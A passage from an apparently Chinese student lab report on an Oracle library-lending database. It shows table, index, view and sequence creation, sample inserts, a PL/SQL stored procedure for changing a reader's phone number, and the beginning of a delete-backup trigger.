loan\reserve 表。使用 <code>create</code>关键字进行创建。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114005306564.png" alt="image-20231114005306564" style="zoom: 33%;" /><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--创建借阅者信息表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> reader (</span><br><span class="line">Read_ID <span class="type">char</span>(<span class="number">18</span>) <span class="keyword">primary</span> key,</span><br><span class="line">Read_Name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Read_Addr <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">null</span>,</span><br><span class="line">Read_Tel <span class="type">varchar</span>(<span class="number">11</span>) <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">--创建员工信息表EMPLOYEE</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> EMPLOYEE (</span><br><span class="line">Empl_ID <span class="type">char</span>(<span class="number">4</span>) <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">Empl_Name <span class="type">Varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">Empl_Gender <span class="type">char</span>(<span class="number">2</span>) <span class="keyword">NULL</span>,</span><br><span class="line">Empl_Birthday <span class="type">Date</span> <span class="keyword">NULL</span>,</span><br><span class="line">Empl_Tel <span class="type">varchar</span>(<span class="number">11</span>) <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">--创建图书目录TITTLE</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> TITLE (</span><br><span class="line">Titl_ID Number GENERATED <span class="keyword">AS</span> <span class="keyword">IDENTITY</span>,</span><br><span class="line">Titl_Name <span class="type">varchar</span>(<span class="number">80</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">Titl_Type <span class="type">Varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Titl_PK <span class="keyword">PRIMARY</span> KEY(Titl_ID)</span><br><span class="line">);</span><br><span class="line"><span class="comment">--创建图书信息表BOOK</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> BOOK(</span><br><span class="line">Book_ID NUMBER GENERATED <span class="keyword">AS</span> <span class="keyword">IDENTITY</span>,</span><br><span class="line">Book_Name <span class="type">Varchar</span>(<span class="number">80</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">Book_ISBN <span class="type">Char</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">BOOK_Title Number <span class="keyword">null</span>,</span><br><span class="line">Book_Author <span class="type">varchar</span>(<span class="number">60</span>) <span class="keyword">NULL</span>,</span><br><span class="line">Book_PubDate <span class="type">Date</span> <span class="keyword">NULL</span>,</span><br><span class="line">Book_Money <span class="type">DECIMAL</span>(<span class="number">4</span>,<span class="number">1</span>) <span class="keyword">NULL</span>,</span><br><span class="line">Book_Inlf <span class="type">SmallInt</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Book_PK <span class="keyword">PRIMARY</span> key(Book_ID),</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Book_FK <span class="keyword">FOREIGN</span> KEY(Book_Title) <span class="keyword">REFERENCES</span> TITLE(Titl_ID)</span><br><span class="line">);</span><br><span class="line"><span class="comment">--创建借阅记录表LOAN</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> LOAN(</span><br><span class="line">Loan_ID NUMBER  GENERATED <span class="keyword">AS</span> <span class="keyword">IDENTITY</span>,</span><br><span class="line">Loan_Type <span class="type">char</span>(<span class="number">2</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Loan_BookID number <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Loan_ReaderID <span class="type">char</span>(<span class="number">18</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Loan_Date <span class="type">Date</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Loan_Note <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Loan_PK <span class="keyword">PRIMARY</span> key(Loan_ID),</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Loan_FK1 <span class="keyword">FOREIGN</span> KEY(Loan_BookID) <span class="keyword">REFERENCES</span> BOOK(Book_ID),</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Loan_FK2 <span class="keyword">FOREIGN</span> KEY(Loan_ReaderID) <span class="keyword">REFERENCES</span> READER(Read_ID)</span><br><span class="line">);</span><br><span class="line"><span class="comment">--创建预定图书表RESERVE</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">TABLE</span> RESERVE(</span><br><span class="line">Rese_ID number GENERATED <span class="keyword">AS</span> <span class="keyword">IDENTITY</span>,</span><br><span class="line">Rese_BookID number <span class="keyword">NOT</span> <span class="keyword">null</span>,</span><br><span class="line">Rese_ReaderID <span class="type">char</span>(<span class="number">18</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Rese_Date <span class="type">date</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">Rese_Note <span class="type">varchar</span>(<span class="number">30</span>) <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Rese_PK <span class="keyword">PRIMARY</span> key(Rese_ID),</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Rese_FK1 <span class="keyword">FOREIGN</span> KEY(Rese_BookID) <span class="keyword">REFERENCES</span> BOOK(Book_ID),</span><br><span class="line"><span class="keyword">CONSTRAINT</span> Rese_FK2 <span class="keyword">FOREIGN</span> KEY(Rese_ReaderID) <span class="keyword">REFERENCES</span> READER(Read_ID)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h4><ol><li>索引是什么？<br>(1) 一种供服务器在表中快速查找一行的 ‘数据库结构’<br>(2) 可以理解为：一本书中的 ‘目录’<ol start="2"><li>索引的优点<br>(1) 加快数据的 ‘检索速度’<br>(2) 可以保证列值的 ‘唯一性’（unique、主键）<br>(3) 实现表与表之间的 ‘参照完整性’（外键）<br>(4) 在使用 order by、group by 子句时，可以减少排序和分组的时间</li></ol></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--在图书表中，创建书名列索引Book_Name_Idx</span></span><br><span class="line"><span class="keyword">create</span> index Book_Name_Idx <span class="keyword">on</span> BOOK(Book_Name);</span><br><span class="line"><span class="comment">--在图书表中，创建书目列索引Book_Title_Idx</span></span><br><span class="line"><span class="keyword">create</span> INDEX Book_Title_Idx <span class="keyword">on</span> BOOK(Book_Title);</span><br><span class="line"><span class="comment">--在借阅记录表中，创建借还类型索引Loan_Type_Idx</span></span><br><span class="line"><span class="keyword">create</span> BITMAP index Loan_Type_Idx <span class="keyword">on</span> LOAN(Loan_Type);</span><br><span class="line"><span class="comment">--在借阅记录表中，创建日期列索引Loan_Date_Idx</span></span><br><span class="line"><span class="keyword">create</span> index Loan_Date_Idx <span class="keyword">on</span> LOAN(Loan_Date <span class="keyword">DESC</span>);</span><br><span class="line"><span class="comment">--在图书预定表中，创建日期列索引 Rese_Date_idx</span></span><br><span class="line"><span class="keyword">create</span> index Rese_Date_Idx <span class="keyword">on</span> RESERVE(Rese_Date <span class="keyword">DESC</span>);</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114011645584.png" alt="image-20231114011645584" style="zoom: 33%;" /><h4 id="创建视图对象"><a href="#创建视图对象" class="headerlink" title="创建视图对象"></a>创建视图对象</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--创建查询当前可借图书视图Book_Inlf_View</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> Book_Inlf_View <span class="keyword">as</span> <span class="keyword">select</span> Book_Name,Book_ISBN,Book_Inlf <span class="keyword">from</span> BOOK <span class="keyword">where</span> Book_Inlf <span class="operator">=</span> <span class="number">1</span>; <span class="comment">--0代表不可借，1代表可以借</span></span><br><span class="line"><span class="comment">--创建查询当前借书读者列表视图Loan_Reader_View</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> Loan_Reader_View <span class="keyword">as</span> <span class="keyword">select</span> R.READ_ID,R.Read_Name,B.Book_Name,L.Loan_Date <span class="keyword">from</span> LOAN L,READER R,BOOK B <span class="keyword">where</span> L.Loan_Type <span class="operator">=</span> <span class="string">&#x27;借&#x27;</span> <span class="keyword">and</span> L.loan_BookID <span class="operator">=</span> B.Book_ID <span class="keyword">and</span> L.Loan_ReaderID <span class="operator">=</span> r.Read_ID <span class="keyword">with</span> READ <span class="keyword">ONLY</span>;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114012402556.png" alt="image-20231114012402556" style="zoom:33%;" /><h4 id="创建序列对象"><a href="#创建序列对象" class="headerlink" title="创建序列对象"></a>创建序列对象</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--在Library_DBA用户方案中，创建序列Titl_ID_Seq</span></span><br><span class="line"><span class="keyword">create</span> sequence Titl_ID_Seq <span class="keyword">start</span> <span class="keyword">with</span> <span class="number">1</span> increment <span class="keyword">by</span> <span class="number">10</span>;</span><br><span class="line"><span class="comment">--在Library_DBA用户方案中，创建序列Book_ID_Seq</span></span><br><span class="line"><span class="keyword">create</span> sequence Book_ID_Seq <span class="keyword">start</span> <span class="keyword">with</span> <span class="number">1000</span> increment <span class="keyword">by</span> <span class="number">1</span>;</span><br><span class="line"><span class="comment">--在Library_DBA用户方案中，创建序列Rese_ID_Seq</span></span><br><span class="line"><span class="keyword">create</span> sequence Rese_ID_Seq;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114012718020.png" alt="image-20231114012718020" style="zoom:33%;" /><h4 id="修改表对象结构"><a href="#修改表对象结构" class="headerlink" title="修改表对象结构"></a>修改表对象结构</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> C##LIBRARY_DBA.reader <span class="keyword">add</span> read_birthday <span class="type">date</span>;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114015000998.png" alt="image-20231114015000998" style="zoom:33%;" /><h4 id="删除数据库序列"><a href="#删除数据库序列" class="headerlink" title="删除数据库序列"></a>删除数据库序列</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> sequence Rese_id_seq;</span><br></pre></td></tr></table></figure><h4 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;510111111111111111&#x27;</span>,<span class="string">&#x27;p1ych&#x27;</span>,<span class="string">&#x27;成都&#x27;</span>,<span class="string">&#x27;18788881881&#x27;</span>,to_date(<span class="string">&#x27;2010-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;520111111111111111&#x27;</span>,<span class="string">&#x27;p2ych&#x27;</span>,<span class="string">&#x27;长度&#x27;</span>,<span class="string">&#x27;18788388882&#x27;</span>,to_date(<span class="string">&#x27;2011-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;530111111111111111&#x27;</span>,<span class="string">&#x27;p3ych&#x27;</span>,<span class="string">&#x27;成都&#x27;</span>,<span class="string">&#x27;18788848883&#x27;</span>,to_date(<span class="string">&#x27;2012-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;540111111111111111&#x27;</span>,<span class="string">&#x27;p4ych&#x27;</span>,<span class="string">&#x27;查到&#x27;</span>,<span class="string">&#x27;18788885884&#x27;</span>,to_date(<span class="string">&#x27;2013-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;550111111111111111&#x27;</span>,<span class="string">&#x27;p5ych&#x27;</span>,<span class="string">&#x27;程度&#x27;</span>,<span class="string">&#x27;18788883885&#x27;</span>,to_date(<span class="string">&#x27;2014-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;560111111111111111&#x27;</span>,<span class="string">&#x27;p6ych&#x27;</span>,<span class="string">&#x27;彻底&#x27;</span>,<span class="string">&#x27;18788883886&#x27;</span>,to_date(<span class="string">&#x27;2015-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;570111111111111111&#x27;</span>,<span class="string">&#x27;p7ych&#x27;</span>,<span class="string">&#x27;出的&#x27;</span>,<span class="string">&#x27;18788882887&#x27;</span>,to_date(<span class="string">&#x27;2016-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;580111111111111111&#x27;</span>,<span class="string">&#x27;p8ych&#x27;</span>,<span class="string">&#x27;错的&#x27;</span>,<span class="string">&#x27;18788884888&#x27;</span>,to_date(<span class="string">&#x27;2017-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;590111111111111111&#x27;</span>,<span class="string">&#x27;p9ych&#x27;</span>,<span class="string">&#x27;成电&#x27;</span>,<span class="string">&#x27;18788882889&#x27;</span>,to_date(<span class="string">&#x27;2018-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> reader <span class="keyword">values</span>(<span class="string">&#x27;500111111111111111&#x27;</span>,<span class="string">&#x27;p0ych&#x27;</span>,<span class="string">&#x27;抄的&#x27;</span>,<span class="string">&#x27;18788882880&#x27;</span>,to_date(<span class="string">&#x27;2019-01-01&#x27;</span>,<span class="string">&#x27;yyyy-mm-dd&#x27;</span>) );</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114020655314.png" alt="image-20231114020655314" style="zoom: 33%;" /><h2 id="实验三：“图书借阅管理系统”Oracle-数据库后端-PL-SQL-编程"><a href="#实验三：“图书借阅管理系统”Oracle-数据库后端-PL-SQL-编程" class="headerlink" title="实验三：“图书借阅管理系统”Oracle 数据库后端 PL&#x2F;SQL 编程"></a>实验三：“图书借阅管理系统”Oracle 数据库后端 PL&#x2F;SQL 编程</h2><h3 id="实验原理-2"><a href="#实验原理-2" class="headerlink" title="实验原理"></a>实验原理</h3><p>通过 PL&#x2F;SQL 编程实现图书借阅数据库 Lib的后端数据处理功能。通过 PL&#x2F;SQL 编程，后端主要的数据处理功能包括了数据库存储对象的创建、存储过程查看、代码修改、代码编译、编程调用、存储过程结果删除；以及数据库触发器的创建、存储过程查看、代码修改、代码编译、编程调用、存储过程结果删除。</p><h3 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h3><ul><li>存储过程编程与对象创建</li><li>存储过程查看、代码修改、代码编译</li><li>编写PL&#x2F;SQL主程序调用存储过程执行</li><li>存储过程删除</li><li>触发器编程与创建</li><li>触发器查看、代码修改、代码编译</li><li>触发器应用</li><li>触发器使能控制</li><li>触发器删除</li></ul><h3 id="实验过程-2"><a href="#实验过程-2" class="headerlink" title="实验过程"></a>实验过程</h3><h4 id="存储过程编程"><a href="#存储过程编程" class="headerlink" title="存储过程编程"></a>存储过程编程</h4><h5 id="存储过程创建"><a href="#存储过程创建" class="headerlink" title="存储过程创建"></a>存储过程创建</h5><p>在Library_DBA方案下，编程并创建名为CHANGE_PHONE的存储过程。该存储过程将进行Reader身份信息的确认。如果Reader的id和phone正确,则进行相应的修改，否则，将拒绝修改，并输出相应错误提示信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">procedure</span> change_phone</span><br><span class="line">(</span><br><span class="line">    Read_ID <span class="keyword">in</span> <span class="type">char</span>,</span><br><span class="line">    Read_name <span class="keyword">in</span> varchar2,</span><br><span class="line">    read_tel <span class="keyword">in</span> varchar2,</span><br><span class="line">    new_tel <span class="keyword">in</span> varchar2,</span><br><span class="line">    status_code <span class="keyword">out</span> number,</span><br><span class="line">    status_text <span class="keyword">out</span> varchar2</span><br><span class="line">)</span><br><span class="line"><span class="keyword">is</span></span><br><span class="line">    readid <span class="type">char</span>(<span class="number">18</span>) :<span class="operator">=</span> Read_ID;</span><br><span class="line">    readname varchar2(<span class="number">20</span>) :<span class="operator">=</span> Read_name;</span><br><span class="line">    readtel varchar2(<span class="number">11</span>) :<span class="operator">=</span> read_tel;</span><br><span class="line">    newtel varchar2(<span class="number">11</span>) :<span class="operator">=</span> new_tel;</span><br><span class="line">    tempreadname varchar2(<span class="number">20</span>);</span><br><span class="line">    tempreadtel varchar2(<span class="number">11</span>);</span><br><span class="line">    err_readname exception;</span><br><span class="line">    err_readtel exception;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    status_code :<span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    status_text :<span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;   <span class="comment">-- 初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> reader_name, reader_tel <span class="keyword">into</span> tempreadname, tempreadtel <span class="keyword">from</span> reader <span class="keyword">where</span> reader_id <span class="operator">=</span> readid;</span><br><span class="line"></span><br><span class="line">    if readname <span class="operator">&lt;&gt;</span> tempreadname <span class="keyword">then</span>    <span class="comment">-- 判断输入的读者姓名是否正确</span></span><br><span class="line">        raise err_readname;</span><br><span class="line">    <span class="keyword">end</span> if;</span><br><span class="line"></span><br><span class="line">    if readtel <span class="operator">&lt;&gt;</span> tempreadtel <span class="keyword">then</span>      <span class="comment">-- 判断输入的电话号码是否正确</span></span><br><span class="line">        raise err_readtel;</span><br><span class="line">    <span class="keyword">end</span> if;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">update</span> reader <span class="keyword">set</span> reader_tel <span class="operator">=</span> newtel <span class="keyword">where</span> reader_id <span class="operator">=</span> readid; <span class="comment">-- 更新电话号码</span></span><br><span class="line">    <span class="keyword">commit</span>;</span><br><span class="line"></span><br><span class="line">exception</span><br><span class="line">    <span class="keyword">WHEN</span> NO_DATA_FOUND <span class="keyword">THEN</span></span><br><span class="line">        status_code :<span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        status_text :<span class="operator">=</span> <span class="string">&#x27;读者信息不存在&#x27;</span>;</span><br><span class="line">    <span class="keyword">WHEN</span> err_readname <span class="keyword">THEN</span></span><br><span class="line">        status_code :<span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        status_text :<span class="operator">=</span> <span class="string">&#x27;读者姓名错误&#x27;</span>;</span><br><span class="line">    <span class="keyword">WHEN</span> err_readtel <span class="keyword">THEN</span></span><br><span class="line">        status_code :<span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        status_text :<span class="operator">=</span> <span class="string">&#x27;电话号码错误&#x27;</span>;</span><br><span class="line">    <span class="keyword">WHEN</span> OTHERS <span class="keyword">THEN</span></span><br><span class="line">        status_code :<span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        status_text :<span class="operator">=</span> substr(SQLERRM, <span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">end</span> change_phone;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114024232565.png" alt="image-20231114024232565" style="zoom:33%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114024604385.png" alt="image-20231114024604385" style="zoom:50%;" /><p>运行成功。</p><h5 id="存储过程查看、代码修改、代码编译。"><a href="#存储过程查看、代码修改、代码编译。" class="headerlink" title="存储过程查看、代码修改、代码编译。"></a>存储过程查看、代码修改、代码编译。</h5><p>可以在数据字典USER_OBJECTS中查看该存储过程的基本信息。</p><p>SQL语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Object_name,object_type,created,status <span class="keyword">from</span> user_objects <span class="keyword">where</span> object_type <span class="operator">=</span> <span class="string">&#x27;procedure&#x27;</span> <span class="keyword">and</span> object_name <span class="operator">=</span> <span class="string">&#x27;change_phone&#x27;</span>;</span><br></pre></td></tr></table></figure><p>结果截图：</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114025340146.png" alt="image-20231114025340146" style="zoom: 33%;" /><p>还可以编写SQL程序，在数据字典USER_OBJECTS中执行，对该存储过程进行代码信息的查询，查看存储过程代码信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_source <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;STANDARD&#x27;</span> <span class="keyword">and</span> type <span class="operator">=</span> <span class="string">&#x27;PACKAGE&#x27;</span>;  <span class="comment">--选择了另一段代码查看</span></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114031737209.png" alt="image-20231114031737209" style="zoom: 33%;" /><h5 id="存储过程使用"><a href="#存储过程使用" class="headerlink" title="存储过程使用"></a>存储过程使用</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">decleare</span><br><span class="line">    status number;</span><br><span class="line">    status_text varchar2(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    change_phone(<span class="string">&#x27;201601010101&#x27;</span>, <span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;12345678901&#x27;</span>, <span class="string">&#x27;12345678901&#x27;</span>, status, status_text);</span><br><span class="line">    IF status <span class="operator">&lt;&gt;</span> <span class="number">0</span> <span class="keyword">THEN</span></span><br><span class="line">        dbms_output.put_line(status_text);</span><br><span class="line">    <span class="keyword">ELSE</span></span><br><span class="line">    dbms_output.put_line(<span class="string">&#x27;ok!&#x27;</span>);</span><br><span class="line">    <span class="keyword">end</span> if;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114032228911.png" alt="image-20231114032228911" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231114032437633.png" alt="image-20231114032437633" style="zoom:33%;" /><h5 id="存储过程删除"><a href="#存储过程删除" class="headerlink" title="存储过程删除"></a>存储过程删除</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">procedure</span> change_phone;</span><br></pre></td></tr></table></figure><p>成功执行该SQL语句后，change_phone存储过程从数据库中被删除。</p><h4 id="触发器编程"><a href="#触发器编程" class="headerlink" title="触发器编程"></a>触发器编程</h4><h5 id="触发器创建及编译"><a href="#触发器创建及编译" class="headerlink" title="触发器创建及编译"></a>触发器创建及编译</h5><p>考虑到数据的安全性，在READER表中编程创建一个删除触发器（T_READER_DEL）。该触发器将执行以下任务：当READER表的任一行将被删除时，触发器就会把该行数据记录保存在读者信息删除备份表（READER_DEL_BAK）中，并且在该备份表中记录对READER表做删除操作的用户和删除操作的时间。</p><p>首先创建借阅者信息删除备份表reader_del_bak</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> reader_del_bak (</span><br><span class="line">    Read_ID <span class="type">char</span>(<span class="number">18</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    read_name <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    read_addr <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">null</span>,</span><br><span class="line">    read_tel <span class="type">varchar</span>(<span class="number">11</span>) <span class="keyword">null</span>,</span><br><span class="line">    Del_ID <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">null</span>,</span><br><span class="line">    Del_date <span class="type">DATE</span> <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>并创建名为T_READER_DEL的触发器。</p><blockquote><p> 注意这里一定要用library_dba去操作，也就是normal对象创建触发器。</p></blockquote><figure 